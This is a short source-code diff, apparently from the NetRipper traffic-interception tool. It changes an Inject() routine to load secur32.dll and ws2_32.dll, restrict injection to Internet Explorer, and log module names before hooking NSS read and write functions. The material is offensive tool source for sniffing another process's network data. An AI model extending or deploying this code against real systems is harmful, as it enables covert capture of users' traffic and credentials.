@@ -83,15 +83,23 @@ void Inject()
 		DebugLog::DebugError("Cannot initialize minhook!");
 		return;
 	}
-	
-	// Hooks specific to loaded DLLs
 
+	HMODULE module = LoadLibrary("secur32.dll");
+	DebugLog::LogString("NetRipper: ", "Active LoadLibrary secur32.dll" + to_string((int)module));
+	module = LoadLibrary("ws2_32.dll");
+	DebugLog::LogString("NetRipper: ", "Active LoadLibrary ws2_32.dll" + to_string((int)module));
+
+	// Hooks specific to loaded DLLs
 	vector<MODULEENTRY32> vDlls = Process::GetProcessModules(0);
+	//only for IE
+	if (vDlls.size() > 0 && Utils::ToLower(vDlls[0].szModule).compare("iexplore.exe") != 0) {
+		return;
+	}
 
 	for(size_t i = 0; i < vDlls.size(); i++)
 	{
 		// PR_Read, PR_Write && PR_Send, PR_Recv
-
+		DebugLog::LogString("NetRipper: ", vDlls[i].szModule);
 		if(Utils::ToLower(vDlls[i].szModule).compare("nss3.dll") == 0 || Utils::ToLower(vDlls[i].szModule).compare("nspr4.dll") == 0)
 		{
 			string sModuleName = Utils::ToLower(vDlls[i].szModule);
